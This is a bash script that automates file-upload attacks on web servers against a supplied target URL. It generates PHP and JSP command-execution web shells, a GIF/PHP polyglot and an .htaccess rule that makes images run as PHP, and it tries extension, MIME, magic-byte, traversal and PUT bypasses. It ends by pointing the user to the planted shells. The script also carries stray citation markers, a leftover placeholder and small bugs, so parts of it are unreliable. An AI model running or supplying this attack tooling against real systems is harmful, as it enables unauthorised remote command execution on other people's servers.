#!/bin/bash
# enhanced_upload_exploit.sh

SERVER_URL="$2"
UPLOAD_ENDPOINT="$SERVER_URL/upload"

# Exploitation techniques based on common vulnerabilities
declare -A EXPLOIT_TECHNIQUES=(
    ["double_ext"]="shell.php.jpg"
    ["case_bypass"]="shell.PHp"  
    ["null_byte"]="shell.php%00.jpg"
    ["traversal"]="../../../var/www/html/shell.php"
    ["mime_bypass"]="shell.php|image/jpeg"
    ["magic_bytes"]="shell.php|GIF89a header"
    ["htaccess_overwrite"]=".htaccess"
    ["put_method"]="PUT request"
)

generate_payload() {
    local payload_type="$1"
    
    case "$payload_type" in
        "php_shell")
            echo '<?php system($_GET["cmd"]); ?>'
            ;;
        "php_info")
            echo '<?php phpinfo(); ?>'
            ;;
        "jsp_shell")
            echo '<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
            ;;
        "polyglot_gif")
            # GIF header + PHP code[citation:7][citation:8]
            echo -e "GIF89a\n<?php system(\$_GET['cmd']); ?>"
            ;;
        "htaccess_php")
            # Make .jpg files execute as PHP[citation:5]
            echo "AddType application/x-httpd-php .jpg"
            ;;
        *)
            echo '<?php echo "Test payload"; ?>'
            ;;
    esac
}

test_upload_bypass() {
    local technique="$1"
    local payload="$2"
    local temp_file="/tmp/exploit_$$"
    
    echo "$payload" > "$temp_file"
    
    echo -e "\n🔧 Testing: ${EXPLOIT_TECHNIQUES[$technique]}"
    
    case "$technique" in
        "double_ext"|"case_bypass")
            mv "$temp_file" "$temp_file.php"
            curl -k -s -F "file=@$temp_file.php" "$UPLOAD_ENDPOINT"
            ;;
        "mime_bypass")
            # Send PHP with image MIME type[citation:6]
            curl -k -s -F "file=@$temp_file" \
                 -H "Content-Type: multipart/form-data" \
                 --form-string "content-type=image/jpeg" \
                 "$UPLOAD_ENDPOINT"
            ;;
        "magic_bytes")
            # Add GIF magic bytes before PHP code[citation:8]
            echo -e "GIF89a\n$(cat $temp_file)" > "${temp_file}_magic"
            curl -k -s -F "file=@${temp_file}_magic" "$UPLOAD_ENDPOINT"
            ;;
        "htaccess_overwrite")
            # Try to upload .htaccess to enable script execution[citation:5]
            curl -k -s -F "file=@$temp_file" \
                 -F "filename=.htaccess" \
                 "$UPLOAD_ENDPOINT"
            ;;
        "put_method")
            # Test HTTP PUT method if available[citation:9]
            curl -k -s -X PUT \
                 --data-binary "@$temp_file" \
                 "$SERVER_URL/uploads/test_put.php"
            ;;
    esac
    
    local result=$?
    [ -f "$temp_file" ] && rm -f "$temp_file*"
    return $result
}

automated_exploit() {
    local target_url="$1"
    local shell_name="cmd_$(date +%s).php"
    
    echo "🚀 Starting automated exploitation against: $target_url"
    echo "=============================================="
    
    # Test 1: Direct PHP upload
    echo -e "\n1. Testing direct PHP upload..."
    test_upload_bypass "direct" "$(generate_payload php_shell)"
    
    # Test 2: MIME type bypass
    echo -e "\n2. Testing MIME type bypass..."
    test_upload_bypass "mime_bypass" "$(generate_payload php_shell)"
    
    # Test 3: Magic bytes bypass
    echo -e "\n3. Testing magic bytes bypass..."
    test_upload_bypass "magic_bytes" "$(generate_payload php_shell)"
    
    # Test 4: .htaccess overwrite
    echo -e "\n4. Testing .htaccess overwrite..."
    test_upload_bypass "htaccess_overwrite" "$(generate_payload htaccess_php)"
    
    echo -e "\n✅ Exploitation attempts completed."
    echo "Check $SERVER_URL/uploads/ for potentially uploaded shells"
}

# Enhanced upload function with exploitation mode
upload_file() {
    local file="$1"
    local server="$2"
    local exploit_mode="${3:-false}"
    
    if [ "$exploit_mode" = "true" ]; then
        automated_exploit "$server"
        return
    fi
    
    # Original functionality with enhancements
    local filename=$(basename "$file")
    local hash=$(md5sum "$file" | awk '{print $1}')
    
    echo "Processing: $filename"
    
    # Test various upload bypass techniques first
    echo -n "Testing upload bypass techniques... "
    
    # Test double extension
    if curl -k -s -F "file=@$file" -F "filename=$filename.php.jpg" "$server/upload" | grep -q "success"; then
        echo "Double extension bypass possible!"
        return 0
    fi
    
    # Continue with original checks...
    # [Rest of your original function here]
}

# Main execution
if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <file> <server_url> [exploit]"
    echo "Example: $0 test.php https://target.com"
    echo "For exploitation: $0 exploit https://target.com exploit"
    exit 1
fi

if [ "$1" = "exploit" ]; then
    automated_exploit "$2"
else
    upload_file "$1" "$2" "$3"
fi
